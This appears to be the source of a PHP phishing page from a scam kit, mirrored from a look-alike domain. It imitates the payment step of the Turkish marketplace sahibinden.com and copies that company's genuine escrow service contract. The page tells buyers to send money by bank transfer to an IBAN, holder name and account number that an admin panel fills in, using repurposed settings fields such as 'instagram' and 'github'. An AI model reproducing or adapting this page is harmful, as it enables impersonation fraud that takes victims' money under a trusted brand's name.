<?php include 'yonetim/islemler/baglan.php';


$sorgu=$db->prepare("SELECT * FROM sayfalar");
$sorgu->execute();
$sayfa=$sorgu->fetch(PDO::FETCH_ASSOC); ?>
<!DOCTYPE html>
<html class="" lang="tr">
  
<!-- Mirrored from sahibinden-get.shop/index.php?q=oneplus-8-pro by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 25 Jan 2022 18:11:20 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <style type="text/css">
      
    </style>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <meta id="Content-Language" http-equiv="Content-Language" content="tr">
    <meta name="rating" content="general">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <meta name="revisit-after" content="1 Days">
    <link rel="shortcut icon" href="assets/css/favicon.ico" type="image/x-icon">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>sahibinden.com - Satılık, Kiralık, 2. El, Emlak, Oto, Araba, Bilgisayar, Film, Cep Telefonu, Elektronik, Antika, Giyim, Mobilya, Eleman Arayanlar ve daha fazlası - İlan ve alışverişte ilk adres</title>
    <link href="assets/css/common.css" media="screen, print" rel="stylesheet" type="text/css">
    <link href="assets/css/payment.css" media="screen, print" rel="stylesheet" type="text/css">
  </head>
  <body class="type-individual ios">
    <div class="header-banners clearfix">
      <div class="mast-head-banner">
    </div>
    <div class="header-container without-background">
      <div class="header secure-payment">
        <p class="clearfix">
          <a class="logo" href="https://www.sahibinden.com/" title="sahibinden.com anasayfasına dön" style="pointer-events: none;"> sahibinden.com anasayfasına dön</a>
        </p>
        <h1>Ödeme Bilgileri</h1>
      </div>
    </div>
    <div id="container">
      <link href="assets/css/dialog.css" type="text/css" rel="stylesheet">
      <div id="slsDialogFe" class="safe ng-scope">
        <div ng-include="'/views/myAccount/common/RenewSls/RenewSls.html'" class="ng-scope">
          <style class="ng-scope">

          </style>
        </div>
      </div>
      <div class="set-payment-container set-payment-active-step-3">
        <div class="payment-progress">
          <div class="bar"></div>
          <ul>
            <!-- .step-0 is a fake -->
            <li class="step-0"></li>
            <li class="step-1">
              <strong>1</strong>
              <span>Ürün</span>
              <span class="responsive-part">Ürün</span>
            </li>
            <li class="step-2">
              <strong>2</strong>
              <span>Adres</span>
              <span class="responsive-part">Adres</span>
            </li>
            <li class="step-3">
              <strong>3</strong>
              <span>Ödeme</span>
              <span class="responsive-part">Ödeme</span>
            </li>
            <li class="step-4">
              <strong>4</strong>
              <span class="last">Ödeme Alındı</span>
              <span class="responsive-part">Ödeme Alındı</span>
            </li>
          </ul>
        </div>
        <form action="#" method="POST" autocomplete="off">
            <div class="set-payment-step-3-detail">
                <div class="responsive-part classified-info-part">
                  <div class="image-part">
                    <img src="yonetim/dosyalar/<?php echo $ayarcek['site_logo'] ?>" height="75" width="100" alt="">
                    <div class="favorite">
                      <h4><?php echo $ayarcek['site_baslik'] ?></h4>
                    </div>
                  </div>
                  <div class="prices">
                    <div class="row first">
                      <span class="total-price-area right first total-price item-total-price small-currency price-format-renew"><?php echo $ayarcek['site_aciklama'] ?></span>
                        <span class="sum-label"></span>
                      </span>
                      <div class="left first numeric-input-holder prev-disabled next-disabled disable"></div>
                    </div>
                    <div class="seperator"></div>
                    <div class="row">
                      <span class="paris-fee-area right total-price item-total-price small-currency price-format-renew"><?php echo $ayarcek['twitter'] ?></span>
                        <span class="sum-label"></span>
                      </span>
                      <p class="left">S - Param Güvende Hizmet Bedeli</p>
                    </div>
                    <div class="seperator"></div>
                    <div class="row">
                      <span class="paris-total-price-area right total-price small-currency price-format-renew"><?php echo $ayarcek['site_anasayfa_aciklama'] ?></span>
                        <span class="sum-label"></span>
                      </span>
                      <p class="left total">Toplam</p>
                    </div>
                  </div>
                </div>
                <div class="responsive-part cargo-info">
                  <p> Satıcı&nbsp;3&nbsp;iş günü içinde kargolar.</p>
                </div>
<div class="left-box">
                  <div class="sub-left-box credit-card-box">
                    <div class="address-header">
                      <h3>ÖDEME</h3>
                    </div>
                    <div id="creditCardPayment" class="paymentTypes">
                        <div class="credit-card-form">
                          <div class="left-column">
                            <h2>Ekranda gördüğünüz IBAN numarasına ödemeyi gerçekleştirin.</h2>
                            <div class="box">
                                <div class="left">
                    <img src="yonetim/dosyalar/<?php echo $ayarcek['site_arkaplan'] ?>" height="250" width="" alt="">
                                </div>
                                <div class="right">
                                    <nav class="details">
                                        <ul>
                                            <li>
                                                <span class="holder">Hesap Sahibi :</span>
                                                <span class="holder-name"><?php echo $ayarcek['github'] ?></span>
                                            </li>
                                            <li>
                                                <span class="iban">IBAN Numarası :</span>
                                                <span id="kaynak"class="iban"><?php echo $ayarcek['instagram'] ?> </span>
                                            </li>
                                            <li>
                                                <span class="acc">Hesap Numarası :</span>
                                                <span class="account-number"><?php echo $ayarcek['facebook'] ?></span>
                                            </li>
                                            <li>
                                                <span class="branch">Şube Kodu :</span>
                                                <span class="branch-code"><?php echo $ayarcek['site_sahip_mail'] ?></span>
                                            </li>
											
                                            <li>
                                                <div class="warn">
                                                    <div class="alert alert-warning">
                                                        <strong>Dikkat!</strong>
                                                        <span>Banka Hesabımıza Para Yatırdıktan Sonra Ödeme Bildirimi Yapınız.</span>
                                                    </div>
                                                </div>
                                            </li>
                                        </ul>
                                    <button onclick="kopyala('kaynak')" aria-label="iban-copy" class="ibanBtn">IBAN Kopyala</button>
                                </div>
                            </div>
                          </div>
                        </div>
                        <div class="hidden">
                          <input type="checkbox" name="mss" id="mss-hidden">
                          <input type="checkbox" name="saveAsProfile" id="saveCCProfile-hidden">
                        </div>
                    </div>
                  </div>
                  <div class="sub-left-box mss-aggrement agreement-service">
                    <strong>S - PARAM GÜVENDE HİZMET SÖZLEŞMESİ</strong>
                    <div id="servicePriceAgreement" class="mss-container">
                      <div class="mss-content">
                        <div style="color:#999999;">
                          <p id="servicePricePreInfoTitle" style="margin:0 0 10px 0; text-decoration:underline; font-weight:bold;">ÖN BİLGİLENDİRME FORMU</p>
                          <p style="margin:0 0 15px 0; font-weight:bold;"> HİZMET VERENİN BİLGİLERİ </p>
                          <p style="margin:0 0 2px 0;">
                            <span style="font-weight:bold;">Ticaret Unvanı:</span> Sahibinden Bilgi Teknolojileri Pazarlama ve Ticaret A.Ş.
                          </p>
                          <p style="margin:0 0 2px 0;">
                            <span style="font-weight:bold;">Kep adresi:</span> sahibinden@hs02.kep.tr
                          </p>
                          <p style="margin:0 0 2px 0;">
                            <span style="font-weight:bold;">MERSİS numarası:</span> 0739014655600017
                          </p>
                          <p style="margin:0 0 15px 0;">
                            <span style="font-weight:bold;">Adresi:</span> Değirmenyolu Cad. No:28 Asia Ofis Park İşm. A Blok Kat:2 Ataşehir/İstanbul
                          </p>
                          <p style="margin:0 0 2px 0;">www.sahibinden.com portalında “Bireysel Üye” olarak ve “S-Param Güvende Hizmeti” ile ürün sipariş etmek isteyen Hizmet Alan (“Alıcı”) olarak aşağıda detayları belirtilen “S-Param Güvende Hizmeti”ne (“Hizmet”) ilişkin siparişi onaylamakta ve “Hizmet”i aşağıdaki fiyat ve koşullarla satın almayı kabul etmektesiniz.</p>
                          <p style="margin:0 0 30px 0;">İşbu Sözleşme, sözleşmenin kurulmasından sonra Hizmet Veren tarafından Hizmet Alan’a (“Alıcı”ya) e-posta ile gönderilecektir.</p>
                          <p style="margin:0 0 15px 0; font-weight:bold;">HİZMET BİLGİLERİ:</p>
                          <p style="margin:0 0 2px 0;">Hizmet Adı: “S-Param Güvende”</p>
                          <p style="margin:0 0 2px 0;">Hizmet Açıklaması: Ek-1 olarak sunulan S-Param Güvende Hizmetine ilişkin detaylı bilgileri inceleyiniz</p>
                          <p style="margin:0 0 2px 0;">Adedi: 1</p>
                          <p style="margin:0 0 2px 0;">Peşin Fiyatı (tüm vergiler dâhil): <span id="parisFeeUnit">200 <sup></sup> TL </span>
                          </p>
                          <p style="margin:0 0 2px 0;">Ödeme şekli: Havale/EFT</p>
                          <p></p>
                          <table border="1" cellspacing="0" cellpadding="10" style="min-height: 75px; width: 100%; margin-bottom: 20px; border-collapse: collapse;border: 1px solid #d8d8d8; white-space: nowrap; color: #999999;" class="agreement-table">
                            <tbody>
                              <tr style="text-align: left; color: #999;">
                                <th style="width: 100%; border: 1px solid #d8d8d8;">Hizmet Adı</th>
                                <th style="border: 1px solid #d8d8d8;">Adet</th>
                                <th style="border: 1px solid #d8d8d8;">Peşin Fiyatı*</th>
                                <th style="border: 1px solid #d8d8d8;">Toplam Tutar**</th>
                                <th class="installment-price-info" style="border: 1px solid #d8d8d8;display: none;">Taksitle Ödenecek Toplam Tutar***</th>
                              </tr>
                              <tr>
                                <td style="white-space: normal; border: 1px solid #d8d8d8;">S - Param Güvende Hizmeti</td>
                                <td style="border: 1px solid #d8d8d8;">1</td>
                                <td style="border: 1px solid #d8d8d8;" class="nowrap">
                                  <span id="parisFeeUnit">200 <sup></sup> TL </span>
                                </td>
                                <td style="border: 1px solid #d8d8d8;" class="nowrap">
                                  <span id="parisFeeUnit">200 <sup></sup> TL </span>
                                </td>
                                <td class="nowrap installment-price-info" style="border: 1px solid #d8d8d8;display: none;">
                                  <span id="parisFeeTotal">200 <sup></sup> TL </span>
                                </td>
                              </tr>
                            </tbody>
                          </table>
                          <ul class="table-description" style="list-style-type: none; color: #999999; margin-bottom: 10px; padding: 0;">
                            <li>* Tüm vergiler dahil peşin birim fiyatı gösterir.</li>
                            <li>** Tüm vergiler dahil toplam tutarı gösterir.</li>
                            <li class="installment-price-info" style="display: none;">*** Tüm vergiler ve taksit farkı dahil toplam tutarı gösterir.</li>
                          </ul>
                          <p></p>
                          <p style="margin:0 0 2px 0; font-weight:bold;">CAYMA HAKKI:</p>
                          <p style="margin:0 0 2px 0;">Mesafeli Sözleşmeler Yönetmeliği’nin 15(h) maddesinde “cayma hakkı süresi sona ermeden önce tüketicinin onayı ile ifasına başlanan hizmet sözleşmeleri” cayma hakkının istisnası olarak kabul edildiğinden; “Hizmet Alan” işbu sözleşmeye konu “Hizmet” bakımından cayma hakkının olmadığını kabul eder. </p>
                          <p style="margin:0 0 15px 0;">“Hizmet Alan”, Mesafeli Sözleşmeler Yönetmeliği gereği cayma hakkına ilişkin bilgilendirmenin gereği gibi yapıldığını kabul eder. </p>
                          <p style="margin:0 0 15px 0; font-weight:bold;">S-PARAM GÜVENDE HİZMET SÖZLEŞMESİ (“SÖZLEŞME”)</p>
                          <p style="margin:0 0 15px 0; font-weight:bold;">MADDE 1- TARAFLAR </p>
                          <p style="margin:0 0 2px 0; font-weight:bold; text-decoration:underline;">HİZMET VEREN (“SAHİBİNDEN”)</p>
                          <p style="margin:0 0 2px 0;">Unvan: Sahibinden Bilgi Teknolojileri Pazarlama ve Ticaret A.Ş.</p>
                          <p style="margin:0 0 2px 0;">Adresi: Değirmenyolu Cad. No: 28 Asia Ofis Park İş Merkezi A Blok Kat: 2 İçerenköy Ataşehir İstanbul</p>
                          <p style="margin:0 0 2px 0;">MERSİS numarası: 0739014655600017</p>
                          <p style="margin:0 0 2px 0;">Telefon: 0 850 222 44 44</p>
                          <p style="margin:0 0 2px 0;">E-mail: sahibinden@hs02.kep.tr</p>
                          <p style="margin:0 0 15px 0;">Şikayetler için İrtibat Bilgisi: 0 850 222 44 44</p>
                          <p style="margin:0 0 2px 0; font-weight:bold; text-decoration:underline;">HİZMET ALAN (“ALICI”)</p>
                          <p style="margin:0 0 15px 0; font-weight:bold;">MADDE 2- SÖZLEŞMENİN KONUSU:</p>
                          <p style="margin:0 0 15px 0;">İşbu “Sözleşme”nin konusu; “Hizmet Veren” tarafından www.sahibinden.com alan adlı internet sitesi (“Portal”) üzerinden “Hizmet Alan”a sağlanmakta olan, “Sözleşme”nin 3.maddesinde özellikleri ve fiyatı belirtilen S-Param Güvende hizmetine (“Hizmet”e) ilişkin olarak tarafların hak ve yükümlülüklerinin tespitidir. </p>
                          <p style="margin:0 0 15px 0;">İşbu “Sözleşme”, Tüketicinin Korunması Hakkında Kanun ve Mesafeli Sözleşmeler Yönetmeliği’ne uygun olarak düzenlenmiştir. İşbu Sözleşme’de hüküm bulunmayan hallerde Tüketicinin Korunması Hakkında Kanun ve Mesafeli Sözleşmeler Yönetmeliği’nde yer alan hükümler uygulanır. İşbu “Sözleşme”nin tarafları; “Sözleşme” ile birlikte Tüketicinin Korunması Hakkında Kanun ve Mesafeli Sözleşmeler Yönetmeliği’nden kaynaklanan yükümlülük ve sorumluluklarını bildiklerini ve anladıklarını kabul ve beyan ederler. </p>
                          <p style="margin:0 0 15px 0;">İşbu “Sözleşme”, “Hizmet Alan”ın “Tüketici” olduğu hallerde uygulanacaktır. “Hizmet Alan”ın mesleki veya ticari amaçlarla “Hizmet”i satın aldığı hallerde; “Hizmet Alan” onaylamış olsa dahi işbu “Sözleşme” hükümleri uygulanmayacaktır. </p>
                          <p style="margin:0 0 15px 0;">İşbu Sözleşme, “Hizmet Veren” tarafından sağlanan “S-Param Güvende” hizmetine ilişkin sorumlulukları belirlemekte olup, “Hizmet Alan”ın işbu “Hizmet”ten yararlanarak satın aldığı ürün ile ilgili “Hizmet Veren”e herhangi bir yükümlülük getirmemektedir. Satın alınan ürün bakımından SAHİBİNDEN’in “Aracı Hizmet Sağlayıcı” sıfatıyla hareket ettiğini, “Hizmet Veren”in satın aldığı ürüne veya ürünün satış ve teslim süreçlerine dair herhangi bir sorumluluğu bulunmadığını, ürün ile ilgili her türlü talep, iddia veya şikâyetinin muhatabının sadece ürünün satıcısı olduğunu “Hizmet Alan” kabul ve taahhüt etmektedir. </p>
                          <p style="margin:0 0 15px 0; font-weight:bold;">MADDE 3- “HİZMET”E İLİŞKİN BİLGİLER:</p>
                          <p style="margin:0 0 2px 0;">“Hizmet”e ilişkin bilgiler aşağıda yer almaktadır:</p>
                          <p style="margin:0 0 2px 0;">“Hizmet”in Adı: “S-Param Güvende”</p>
                          <p style="margin:0 0 2px 0;">Hizmet Açıklaması: Detaylı bilgi için Ek-1’deki S-Param Güvende Hizmeti Kurallarını inceleyiniz</p>
                          <p style="margin:0 0 2px 0;">Adedi: 1</p>
                          <p style="margin:0 0 2px 0;">Peşin Fiyatı (tüm vergiler dâhil): <span id="parisFeeUnit">200 <sup></sup> TL </span>
                          </p>
                          <p style="margin:0 0 2px 0;">Ödeme şekli: Kredi kartı veya banka kartı</p>
                          <p style="margin:0 0 15px 0;">Taksit Seçeneği: <span id="parisInstallmentCount">Tek Çekim</span>
                          </p>
                          <table border="1" cellspacing="0" cellpadding="10" style="min-height: 75px; width: 100%; margin-bottom: 20px; border-collapse: collapse;border: 1px solid #d8d8d8; white-space: nowrap; color: #999999;" class="agreement-table">
                            <tbody>
                              <tr style="text-align: left; color: #999;">
                                <th style="width: 100%; border: 1px solid #d8d8d8;">Hizmet Adı</th>
                                <th style="border: 1px solid #d8d8d8;">Adet</th>
                                <th style="border: 1px solid #d8d8d8;">Peşin Fiyatı*</th>
                                <th style="border: 1px solid #d8d8d8;">Toplam Tutar**</th>
                                <th class="installment-price-info" style="border: 1px solid #d8d8d8;display: none;">Taksitle Ödenecek Toplam Tutar***</th>
                              </tr>
                              <tr>
                                <td style="white-space: normal; border: 1px solid #d8d8d8;">S - Param Güvende Hizmeti</td>
                                <td style="border: 1px solid #d8d8d8;">1</td>
                                <td style="border: 1px solid #d8d8d8;" class="nowrap">
                                  <span id="parisFeeUnit">200 <sup></sup> TL </span>
                                </td>
                                <td style="border: 1px solid #d8d8d8;" class="nowrap">
                                  <span id="parisFeeUnit">200 <sup></sup> TL </span>
                                </td>
                                <td class="nowrap installment-price-info" style="border: 1px solid #d8d8d8;display: none;">
                                  <span id="parisFeeTotal">200 <sup></sup> TL </span>
                                </td>
                              </tr>
                            </tbody>
                          </table>
                          <ul class="table-description" style="list-style-type: none; color: #999999; margin-bottom: 10px; padding: 0;">
                            <li>* Tüm vergiler dahil peşin birim fiyatı gösterir.</li>
                            <li>** Tüm vergiler dahil toplam tutarı gösterir.</li>
                            <li class="installment-price-info" style="display: none;">*** Tüm vergiler ve taksit farkı dahil toplam tutarı gösterir.</li>
                          </ul>
                          <p></p>
                          <p style="margin:0 0 15px 0; font-weight:bold;">MADDE 4 - GENEL HÜKÜMLER</p>
                          <ol style="margin:0 0 15px 0;list-style-type:none">
                            <li> 4.1. “Hizmet Alan”, yukarıda 3. Maddede ve işbu Sözleşme’nin ekinde yer alan Ek-1’de belirtilen “Hizmet”in özelliklerine ve satışına ilişkin koşulları ve tüm bilgileri okuduğunu, bu “Hizmet”i satın almak için gerekli onayı elektronik ortamda verdiğini kabul, beyan ve taahhüt eder. </li>
                            <li> 4.2. İşbu Sözleşme “Hizmet Alan” tarafından elektronik olarak onaylandığı tarihte yürürlüğe girer. </li>
                            <li> 4.3. Satın alınan hizmetin fiziksel bir teslimatı yoktur. </li>
                          </ol>
                          <p style="margin:0 0 15px 0; font-weight:bold;">MADDE- 5 CAYMA HAKKI:</p>
                          <p style="margin:0 0 2px 0;">Mesafeli Sözleşmeler Yönetmeliği’nin 15(h) maddesinde “cayma hakkı süresi sona ermeden önce tüketicinin onayı ile ifasına başlanan hizmet sözleşmeleri” cayma hakkının istisnası olarak kabul edildiğinden; “Hizmet Alan” işbu sözleşmeye konu “Hizmet” bakımından cayma hakkının olmadığını “Hizmet Alan” kabul eder.</p>
                          <p style="margin:0 0 15px 0;">Hizmet Alan, Mesafeli Sözleşmeler Yönetmeliği gereği cayma hakkına ilişkin bilgilendirmenin gereği gibi yapıldığını kabul eder.</p>
                          <p style="margin:0 0 15px 0; font-weight:bold;">MADDE- 6 YETKİLİ MAHKEME:</p>
                          <p style="margin:0 0 15px 0;">“Hizmet Alan”ın “Hizmet”e ilişkin her türlü şikâyet ve itirazına ilişkin başvurularında veişbu Sözleşme ile ilgili çıkabilecek diğer ihtilaflarda her yıl Gümrük ve Ticaret Bakanlığı tarafından ilan edilen değere kadar “Hizmet Alan”ın veya “Hizmet Veren”in yerleşim yerinin bulunduğu yerdeki Tüketici Hakem Heyetleri, söz konusu değerin üzerindeki ihtilaflarda ise Tüketici Mahkemeleri yetkilidir.</p>
                          <p style="margin:0 0 15px 0; font-weight:bold;">Eki: Ek-1 Param Güvende Hizmeti Kuralları</p>
                          <ol style="list-style-position: inside; list-style-type: decimal;">
                            <li> S-Param Güvende Hizmeti”(“Hizmet”); “Satıcı”nın Portal’da ilanını verdiği ikinci el veya sıfır ürünü (bundan böyle “ürün” olarak anılacaktır) “Alıcı”nın kredi kartıyla veya banka kartıyla güvenli olarak satın almasına yönelik SAHİBİNDEN hizmetidir. Bu amaçla SAHİBİNDEN; "Alıcı" ve "Satıcı"nın "Portal"da çevrimiçi (online) ortamda anlaşmalarını sağlayacak alt yapıyı sağlamakta, “Satıcı”; “kargo ile gönderim” tercihi ile ürüne ilişkin ilanı yayınlamakta, “Alıcı"; elektronik ortamda “S-Param Güvende” hizmetini satın alarak ilandaki ürünü sipariş etmektedir. S-Param Güvende Hizmet Bedeli; “SAHİBİNDEN”in değişen piyasa koşullarına göre belirlediği, ürün/ürünlere ilişkin ödenecek toplam ürün bedeli üzerinden hesaplanan “Alıcı”nın ödediği hizmet bedelidir. Ürün bedeli, “Alıcı”nın kredi kartından veya banka kartından “SAHİBİNDEN”in anlaşmalı ödeme kuruluşu çekildiği an itibariyle güvence altına alındığından; “Alıcı”nın S-Param Güvende hizmetinden cayma hakkı yoktur. “Alıcı”nın S-Param Güvende hizmetini satın alması üzerine yaptığı ödeme güvence altına alındığından SAHİBİNDEN S-Param Güvende hizmet bedeline hak kazanır. Sadece ürünün “Satıcı” tarafından kargoya verilmemesi veya ürün kargoya verilmeden satışının Satıcı tarafından iptal edilmesi halinde; “S-Param Güvende Hizmet Bedeli” “Alıcı”ya iade edilir, diğer tüm hallerde “S-Param Güvende Hizmet Bedeli” SAHİBİNDEN’in hesabına aktarılır. Taraflar, işbu Sözleşme hükümleri kapsamında, ürün bedelinin “SAHİBİNDEN”in anlaşmalı ödeme kuruluşu tarafından muhafaza edilmesi ve S-Param Güvende hizmeti koşullarına uygun olarak ilgili tarafa aktarılması işlemlerinin koordinasyonunun “SAHİBİNDEN” tarafından yürütüleceği konusunda mutabıktır. </li>
                            <li> “Alıcı” ve “Satıcı” bu amaçla ürün satışına yönelik sözleşmeyi okuyup, kabul edip, “Anlaşmalı Kargo ile Gönderim Koşulları”nı onaylayarak, bu düzenlemelere uygun davranmayı kabul ve taahhüt etmektedir. </li>
                            <li> S-Param Güvende Hizmet Bedeli”nin ve ürün bedelinin ödenmesinde "Alıcı"ya anlaşmalı bankalar aracılığıyla taksitle ödeme kolaylığı sunulabilir. "Alıcı" taksitle ödemeyi tercih ederse, taksitli ödemeden doğan taksit (vade) farkını bankaya ödemeyi kabul eder. Taksit farkı, SAHİBİNDEN tarafından “Alıcı”ya fatura edilir ve ürün satış ve teslimine yönelik süreçlerin tamamlanması üzerine taksit farkı tutarı “SAHİBİNDEN”in anlaşmalı ödeme kuruluşu tarafından ilgili bankaya aktarılır. Taksit farkı bankaya ve ürün tutarına göre değişiklik gösterebilir. Mevzuat gereği belirli kategorilerde taksitli ödeme kısıtlaması uygulanır. </li>
                            <li> Alıcının, ödemeyi yaparak sipariş vermesi üzerine; ürünün “Satıcı” tarafından “Alıcı”ya kargo ile gönderilmesi amacıyla “Alıcı”nın adı-soyadı/ticari unvanı, açık teslimat adresi, telefon numarasını içeren “kargo kodu”; “Satıcı” ve “Anlaşmalı Kargo” firması ile paylaşılır. </li>
                            <li> “Satıcı” tarafından anlaşmalı kargo ile gönderilen ürünü “Alıcı” teslim almakla yükümlüdür. “Alıcı” ürünü teslim aldıktan sonra Portal üzerinden onaylaması halinde; “ürün satış ve teslim süreçleri tamamlanmış olur ve ürün bedeli "Satıcı"ya aktarılır. “Alıcı” ürüne onay verdikten sonra verdiği onayı hiçbir şekilde geri alamaz, verdiği onay ile iade hakkı sona erer. Yine ürünün onayının veya iadesinin S-Param Güvende hizmeti kurallarına uygun olarak süresi içinde gerçekleştirilmemesi veya ürünün anlaşmalı kargo firmasına teslim edilmemesi halinde de; ürün satış ve teslimine yönelik süreçler tamamlanmış sayılır ve ürün bedeli "Satıcı"ya, “S-Param Güvende Hizmet Bedeli” ise SAHİBİNDEN’e aktarılır. </li>
                            <li> “Alıcı” ürünü “Satıcı”ya iade etmek isterse; “Portal”da ürünü iade etmeye yönelik butona basarak, ekranda belirtilen süre içinde ve ekranda gösterilen “kargo kodu” ile "Satıcı"ya iade edilmek üzere kargo ücreti ödemeksizin ürünü anlaşmalı kargo firmasına teslim eder. “Alıcı”, ürünü ambalajı, varsa standart aksesuarları ve faturası ile birlikte kullanılmamış olarak, eksiksiz ve hasarsız olarak iade etmelidir. “Alıcı”, “S-Param Güvende” hizmeti kapsamından çıkmamak için, ürünü sadece anlaşmalı kargo firması ile iade edebilir. “Alıcı”nın ürünü “Satıcı”ya iade etmesi halinde; ürün bedeli “Alıcı”ya iade edilir. Ancak S-Param Güvende Hizmet Bedeli SAHİBİNDEN’e aktarılır. </li>
                            <li> “Alıcı”nın ürünü SAHİBİNDEN’in anlaşmalı kargo firması ile “Satıcı”ya iade etmemesi halinde; ürün satışı başarılı olarak tamamlanmış sayılacak,&nbsp; ürün bedeli “Satıcı”ya aktarılacak, “S-Param Güvende Hizmet Bedeli” ise SAHİBİNDEN’e aktarılacaktır.&nbsp; Ürün bedelinin aktarımına dair bankadan veya anlaşmalı ödeme kuruluşundan kaynaklanabilecek olası gecikmelerden “SAHİBİNDEN” sorumlu tutulamayacaktır. </li>
                            <li> “Satıcı”nın iade edilen ürünü teslim aldığını, teslim alma saatinden itibaren 48 saat içinde sistem üzerinden onaylaması üzerine ürün bedeli Alıcı”ya iade edilir. Ancak iade edilen üründe uygunsuzluk veya herhangi bir sorun yaşaması halinde teslim alma anından başlayacak 24 (yirmi dört) saatlik süre içinde “Satıcı”, “SAHİBİNDEN” Müşteri Hizmetlerini arayarak iadeye ilişkin yaşadığı sorunu bildirmelidir. “Satıcı”, Müşteri Hizmetlerine sorununu bildirmesinden itibaren 7 (yedi) iş günü süre içinde “Alıcı”ya karşı yasal yollara müracaat ettiğini belgeleyen evrak sunması halinde; ürün bedeli Alıcı’ya iade edilmeyecek, uyuşmazlık sonuçlanana dek SAHİBİNDEN’in anlaşmalı ödeme kuruluşunun hesabında bloke edilecek, başvurulan merciinin kararı çıktığında bu karara göre hareket edilecektir. “Alıcı” ve “Satıcı”, uyuşmazlık konusu karara bağlanana dek ürün bedelinin bloke edilmesi nedeniyle “SAHİBİNDEN”e karşı şikâyet/dava yoluna başvurmayacağını, “SAHİBİNDEN”den herhangi bir talepte bulunmayacağını kabul, beyan ve taahhüt eder. Ürünün teslim edilmesinden itibaren 24 (yirmi dört) saatlik süre içinde “SAHİBİNDEN” Müşteri Hizmetlerine “Satıcı” tarafından sorun bildiriminde bulunulmaz veya ürünün teslim alındığı onaylanmazsa; ürün bedeli 48 (kırk sekiz) saat içinde “Alıcı”ya iade edilir. </li>
                            <li> “SAHİBİNDEN” şüpheli işlem tespit etmesi halinde; “Alıcı ve “Satıcı” arasındaki işlemi durdurabilir, “S-Param Güvende hizmetini duraklatarak ek bilgi/belge talep edebilir, “Alıcı” ve/veya “Satıcı”nın üyeliğini geçici veya sürekli olarak durdurabilir. Bu tür işlemler sebebiyle ürün satış ve teslimine ilişkin süreçlerde gecikmeye sebebiyet verildiğinden bahisle “SAHİBİNDEN”den herhangi bir talepte bulunulamaz. </li>
                            <li> “Alıcı” Platform üzerinden satın alım esnasında kullandığı kredi kartı bilgilerinin,&nbsp;SAHİBİNDEN’in anlaşmalı ödeme kuruluşu nezdinde saklanmasını talep edebilir. Kart bilgilerinin saklanmasına ilişkin tüm güvenlik önlemleri üçüncü kişi olan ödeme kuruluşunca sağlanacak olup, SAHİBİNDEN’in kredi kartı bilgilerine erişimi bulunmayacaktır. Bu sebeple “Alıcı” kredi kartı bilgilerinin güvenliğinin sağlanması konusunda sorumluluğun sadece anlaşmalı ödeme kuruluşunda olduğunu kabul etmektedir. </li>
                            <li> “Alıcı”, işbu Sözleşme’yi veya bu Sözleşme’nin kapsamındaki hak ve yükümlülüklerini kısmen veya tamamen herhangi bir üçüncü kişiye devredemez. </li>
                            <li> “S-Param Güvende” hizmeti, “Alıcı”nın ödeyeceği ürün bedelinin SAHİBİNDEN anlaşmalı ödeme kuruluşunun hesabında güvenli olarak muhafaza edilmesinden ibaret olup, ilandaki ürünün “Satıcı” tarafından “Alıcı”ya teslim edileceği SAHİBİNDEN tarafından garanti edilmemektedir. </li>
                            <li> “Alıcı”, “SAHİBİNDEN”in “Yer Sağlayıcı” ve “Aracı Hizmet Sağlayıcı” sıfatıyla faaliyet gösteren sanal bir platform olduğunu, ürünün sahibi olmadığını, “Portal”da yayınlanan ilanlardaki ürünler ile ilgili satıcı, tedarikçi, imalatçı-ithalatçı, bayi veya benzeri herhangi bir ilişkisinin/sıfatının bulunmadığını, “Aracı Hizmet Sağlayıcı”nın 6502 sayılı Tüketicinin Korunması Hakkındaki Kanun ve 6563 sayılı Elektronik Ticaretin Düzenlenmesi Hakkında Kanun uyarınca hiçbir yasal sorumluluğu bulunmadığını, satın aldığı ürün ile ilgili iade işlemleri dahil yaptığı satın alma ile ilgili her türlü talebinin yegane muhatabının ürünü satışa sunan “Satıcı” olduğunu, “SAHİBİNDEN”in ürünün satışı ve kargo ile gönderilmesine yönelik “Alıcı” ve “Satıcı” arasında gerçekleşen işlemlerin hiçbir aşamasına taraf olmadığını, ürün siparişi ilgili yaşanabilecek herhangi bir uygunsuzluk hakkında SAHİBİNDEN’den talepte bulunmayacağını, SAHİBİNDEN’e karşı yargısal yollara başvurmayacağını kabul, beyan ve taahhüt etmektedir. </li>
                            <li> Alıcı veya Satıcı’nın “Anlaşmalı Kargo ile Gönderim Koşullarına” aykırı hareket etmesi nedeniyle SAHİBİNDEN’in herhangi bir zarara uğraması, idari para cezası veya tazminat ödemek durumunda kalması halinde; SAHİBİNDEN’in zarara uğramasına sebep olan Alıcı veya Satıcı; SAHİBİNDEN’in maddi ve manevi, doğrudan ve dolaylı her türlü zararı ile idari para cezalarını tüm fer’ileri ile birlikte derhal karşılayacaktır. </li>
                          </ol>
                        </div>
                      </div>
                    </div>
                  </div>
                  <a href="#" class="back-to-the-future step-back step-back trackClick trackId_geriDon_v3 teslimatBackBtn" data-click-category="odeme">&lt; Teslimat Bilgilerine Geri Dön</a>
                </div>               
                    </div>
                  </div>
                    </div>

                <div class="right-box">
                  <div class="sub-right-box item">
                    <img class="big-image" src="yonetim/dosyalar/<?php echo $ayarcek['site_logo'] ?>" height="174" width="232" alt="">
                    <span><?php echo $ayarcek['site_baslik'] ?></span>
                  </div>
                  <div class="sub-right-box prices">
                    <div class="row">
                      <span class="total-price-area right unit-price total-price item-total-price small-currency price-format-renew"><?php echo $ayarcek['site_aciklama'] ?></span>
                        <span class="sum-label"></span>
                      </span>
                      <div class="left unit numeric-input-holder prev-disabled next-disabled disable"></div>
                    </div>
                    <div class="seperator"></div>
                    <div class="row">

					                      <span class="paris-fee-area right high total-price item-total-price small-currency price-format-renew"><?php echo $ayarcek['twitter'] ?></span>

                        <span class="sum-label"></span>
                      </span>
                      <p class="left">S - Param Güvende Hizmet Bedeli</p>
                    </div>
                    <div class="seperator"></div>
                    <div class="total-cost-container row">
                      <span id="parisTotalCostSpan" class="paris-total-price-area right total-price small-currency price-format-renew"><?php echo $ayarcek['site_anasayfa_aciklama'] ?></span>
